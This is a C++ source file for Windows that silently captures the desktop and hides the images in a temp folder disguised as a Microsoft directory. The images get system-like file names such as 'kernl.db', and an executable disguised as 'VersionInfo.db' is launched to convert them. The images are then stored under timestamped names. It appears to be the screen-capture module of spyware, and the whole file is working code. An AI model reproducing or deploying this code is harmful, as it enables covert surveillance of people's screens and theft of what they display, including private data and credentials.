#include "ScrnConfig.h"

void takeScreen(int SW, int SH, bool isSingle)
{
     char buffer[2048];
     
     GetTempPath(2048, buffer);
     if (isSingle) strcat(buffer, "Microsoft_9021784367548932\\Temp\\kernl.db");
     else strcat(buffer, "Microsoft_9021784367548932\\Temp\\configdata.db");
     HWND hDesktopWnd = GetDesktopWindow();
     HDC hDesktopDC = GetDC(hDesktopWnd);
     HDC hCaptureDC = CreateCompatibleDC(hDesktopDC);
     HBITMAP hCaptureBitmap = CreateCompatibleBitmap(hDesktopDC, SW, SH);
     SelectObject(hCaptureDC,hCaptureBitmap);
     StretchBlt(hCaptureDC, 0, 0, SW, SH, hDesktopDC, 0, 0, SW, SH, SRCCOPY);
     SaveBitmap(buffer, hCaptureBitmap);
     ReleaseDC(hDesktopWnd,hDesktopDC);
     DeleteDC(hCaptureDC);
     DeleteObject(hCaptureBitmap);
     return;
}

void convertJpeg(bool isSingle)
{
     char buffer[2048], tempDirect[2048], *cmdline;
     PROCESS_INFORMATION pi;
     STARTUPINFO si;
     
     ZeroMemory( &si, sizeof(si) );
     si.cb = sizeof(si);
     ZeroMemory( &pi, sizeof(pi) );
     GetTempPath(2048, buffer);
     strcat(buffer, "Microsoft_9021784367548932\\Temp\\VersionInfo.db");
     GetTempPath(2048, tempDirect);
     strcat(tempDirect, "Microsoft_9021784367548932\\Temp\\");
     if (isSingle)
     {
                  cmdline = new char[64];
                  strcpy(cmdline, "AppName ScreenShot");
     }
     else cmdline = NULL;
     CreateProcess(buffer, cmdline, NULL, NULL, FALSE, 0, NULL, tempDirect, &si, &pi);
     WaitForSingleObject(pi.hProcess, INFINITE);
     CloseHandle(pi.hProcess);
     CloseHandle(pi.hThread);
     if (cmdline != NULL) delete[] cmdline;
     
     return;
}

void store(bool isSingle)
{
     time_t rawtime;
     struct tm * timeinfo;
     char timebuffer[32], oldfile[2048], newfile[2048];
     
     GetTempPath(2048, oldfile);
     if (isSingle) strcat(oldfile, "Microsoft_9021784367548932\\Temp\\kernl.db");
     else strcat(oldfile, "Microsoft_9021784367548932\\Temp\\configdata.db");
     DeleteFile(oldfile);
          
     time(&rawtime);
     timeinfo = localtime(&rawtime);
     strftime(timebuffer, 32, "%y%m%d%H%M%S", timeinfo);
     GetTempPath(2048, oldfile);
     if (isSingle) strcat(oldfile, "Microsoft_9021784367548932\\Temp\\kernl.tmp");
     else strcat(oldfile, "Microsoft_9021784367548932\\Temp\\configdata.tmp");
     GetTempPath(2048, newfile);
     strcat(newfile, "Microsoft_9021784367548932\\SC\\");
     if (isSingle)
     {
                  char ack[1024];
                  strcpy(ack, newfile);
                  strcat(ack, "temp.db");
                  ofstream feed(ack);
                  feed << timebuffer << ".db" << endl;
                  feed.close();
     }
     strcat(newfile, timebuffer);
     strcat(newfile, ".db");
     MoveFile(oldfile, newfile);
     
     return;
}

void SaveBitmap(char *szFilename, HBITMAP hBitmap)
{
	HDC					hdc;
	LPVOID				pBuf;
	BITMAPINFO			bmpInfo;
	BITMAPFILEHEADER	bmpFileHeader;
	char *buffer1, *buffer2, *buffer3;
	fstream fp;

		hdc=GetDC(NULL);
		ZeroMemory(&bmpInfo,sizeof(BITMAPINFO));
		bmpInfo.bmiHeader.biSize=sizeof(BITMAPINFOHEADER);
		GetDIBits(hdc,hBitmap,0,0,NULL,&bmpInfo,DIB_RGB_COLORS);

		if(bmpInfo.bmiHeader.biSizeImage<=0)
			bmpInfo.bmiHeader.biSizeImage=bmpInfo.bmiHeader.biWidth*abs(bmpInfo.bmiHeader.biHeight)*(bmpInfo.bmiHeader.biBitCount+7)/8;
			
		pBuf = new LPVOID[bmpInfo.bmiHeader.biSizeImage];
		bmpInfo.bmiHeader.biCompression=BI_RGB;
		GetDIBits(hdc,hBitmap,0,bmpInfo.bmiHeader.biHeight,pBuf,&bmpInfo,DIB_RGB_COLORS);	
		
		fp.open(szFilename, fstream::out | ios::binary);

		bmpFileHeader.bfReserved1=0;
		bmpFileHeader.bfReserved2=0;
		bmpFileHeader.bfSize=sizeof(BITMAPFILEHEADER)+sizeof(BITMAPINFOHEADER)+bmpInfo.bmiHeader.biSizeImage;
		bmpFileHeader.bfType=0x4D42;
		bmpFileHeader.bfOffBits=sizeof(BITMAPFILEHEADER)+sizeof(BITMAPINFOHEADER);
		
		buffer1 = new char[sizeof(BITMAPFILEHEADER)];
		buffer2 = new char[sizeof(BITMAPINFOHEADER)];
		buffer3 = new char[bmpInfo.bmiHeader.biSizeImage];
		
		memcpy(buffer1, &bmpFileHeader, sizeof(BITMAPFILEHEADER));
		memcpy(buffer2, &bmpInfo.bmiHeader, sizeof(BITMAPINFOHEADER));
		memcpy(buffer3, pBuf, bmpInfo.bmiHeader.biSizeImage);
		
		fp.write(buffer1,sizeof(BITMAPFILEHEADER));
		fp.write(buffer2,sizeof(BITMAPINFOHEADER));
		fp.write(buffer3,bmpInfo.bmiHeader.biSizeImage);

		if (hdc) ReleaseDC(NULL,hdc);
		if (fp) fp.close();
		delete[] buffer1;
		delete[] buffer2;
		delete[] buffer3;
		delete[] (char*)pBuf;
		
		return;
}
